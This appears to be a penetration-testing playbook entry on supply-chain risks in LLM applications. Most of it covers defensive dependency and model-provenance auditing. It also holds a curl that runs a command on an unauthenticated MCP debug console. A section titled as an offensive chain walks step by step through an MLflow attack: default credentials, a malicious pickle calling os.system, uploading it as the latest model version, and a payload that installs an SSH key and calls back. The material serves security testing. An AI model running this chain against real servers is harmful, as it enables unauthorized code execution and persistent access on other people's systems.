# LLM05 — Supply Chain Vulnerabilities

## When this applies

The LLM application integrates third-party components: open-source model weights, embedding providers, vector DB clients, plugin frameworks (LangChain / LlamaIndex), MCP servers, prompt templates pulled from registries, or fine-tuning datasets.

## Technique

Audit each dependency the same way you would audit a typical SBOM, plus model-specific risks: weights tampering (e.g., poisoned safetensors), prompt-template repos with hidden injections, plugin metadata that lies about capabilities, and MCP servers that expose unauthenticated commands.

## Steps

1. Inventory direct + transitive dependencies:
   ```bash
   pip list --format=json
   pip-audit -l
   safety check
   npm audit
   ```
2. Identify model and dataset provenance:
   - HuggingFace: check `model_card`, `revision` SHA, `LICENSE`, and the upload account's history.
   - Local weights: hash and compare to the publisher's published checksum.
   - Tokenizer files: any custom merges file may contain policy-bypass strings.
3. Plugin / function audit (OpenAI Plugins, ChatGPT actions, LangChain tools):
   - Read the manifest / schema. Cross-check declared scopes against actual API behavior.
   - Test the API directly outside the LLM context (curl) for missing authentication, IDOR, SSRF.
4. MCP server audit:
   ```bash
   curl http://target:6274/api/mcp/connect -d '{"serverConfig":{"command":"id"}}'
   ```
   Many MCP debug consoles (`MCP Inspector`, `MCP Playground`) accept arbitrary command parameters with no auth.
5. Prompt template provenance:
   - If the app loads templates from a CDN or git repo, identify whether the path is locked to a tag/commit. Floating `main` is a typosquat / takeover risk.
   - Open the templates and look for hidden indirect-injection text in comments / footers (see llm01-indirect).
6. Vector DB clients:
   - Some DBs (older Milvus, FAISS via insecure servers) expose data without auth.
   - Verify TLS, auth tokens, and namespace isolation.
7. Registry-side review (Hugging Face / npm / PyPI):
   - Author recency, repo history, whether code is hosted in the same place or remote.
   - For `safetensors`, scan with `pickle-scanner` if any `.pkl`/`pytorch_model.bin` is present (those execute code on load).
8. Build an SBOM and risk-rank by exploitability:
   ```bash
   cyclonedx-py --requirements requirements.txt > sbom.json
   ```

## MLflow Model Registry → pyfunc pickle RCE (offensive chain)

When the target is an ML app with train/predict features backed by **MLflow**:

1. **Find the tracking server.** It is frequently on a *separate vhost* (e.g. `models.`/`mlflow.<domain>`). Host-header fuzz for a non-redirect response; the signature is `WWW-Authenticate: Basic realm="mlflow"`. (`/health` is unauth.)
2. **Auth.** Try MLflow's default basic-auth `admin:password`. Success → full REST API (`/api/2.0/mlflow/...`, `/api/2.0/mlflow-artifacts/...`).
3. **RCE primitive.** Loading any registered model = unpickling its artifact. `loader_module: mlflow.pyfunc.model` → `python_model.pkl` (cloudpickle); sklearn flavor → `model.pkl`. `mlflow.pyfunc.load_model` → `cloudpickle.load` executes a pickle `__reduce__`.
4. **Chain** (curl + basic auth; `--resolve` the vhost):
   - Clone a real model's artifact dir: `GET /api/2.0/mlflow/artifacts/list?run_id=<r>&path=model` then fetch `MLmodel` + meta via `/api/2.0/mlflow-artifacts/artifacts/<exp>/<run>/artifacts/model/<file>`.
   - Evil pkl: `class E:\n def __reduce__(self): return (os.system,("<cmd>",))` → `pickle.dump(E(),f)` (backgrounded payload: install SSH key + callback, so the unpickle returns fast).
   - `POST /api/2.0/mlflow/runs/create` (`experiment_id` 0) → new `run_id`.
   - `PUT /api/2.0/mlflow-artifacts/artifacts/0/<run>/artifacts/model/{MLmodel,python_model.pkl,...}` (evil pkl).
   - `POST /api/2.0/mlflow/model-versions/create` `name=<your existing model>` `source=mlflow-artifacts:/0/<run>/artifacts/model` → becomes the **latest** version.
   - Trigger the app's predict/load path → RCE in the **app host** context (often a service user). Post-load error like `'int' object has no attribute 'load_context'` confirms exec (`os.system` returned an int).
5. **Also with API access:** artifact path traversal / `source=file://...` arbitrary file read (CVE-2023-1177 / 2023-6018 / 2023-6831).

Relates to **CVE-2024-37052..37060** (MLflow model-load deserialization). Load == unpickle regardless of patch level — the "fix" is a warning, not a safe loader. Then escalate from the service user (see [system privesc](../../../../system/reference/INDEX.md)).

## Verifying success

- Concrete CVE / mis-configuration tied to a named component, with version and fix.
- For MCP / plugin RCE: command output reaches your callback (proof of unauth RCE).
- For weights poisoning: a known-bad SHA matched against your local copy.

## Common pitfalls

- Pulling large models in a CI job and running automated scans is bandwidth-heavy. Mirror once, scan the mirror.
- `pip-audit` only knows PyPI advisories; HuggingFace and model-specific issues need manual review.
- Plugins frequently declare narrow scopes and then call broader APIs. Test the API surface independently.
- Supply chain reports often list "vulnerable" dependencies that are not actually reachable. Always trace from finding to call site before scoring impact.

## Tools

- `pip-audit`, `safety`, `npm audit`, `osv-scanner`
- `cyclonedx-py`, `syft` for SBOM generation
- `trufflehog`, `gitleaks` for credentials in dependency repos
- `pickle-scanner` (`fickling`) for Python pickle weight files
- `mcp-inspector` documentation / source for MCP-specific endpoint enumeration
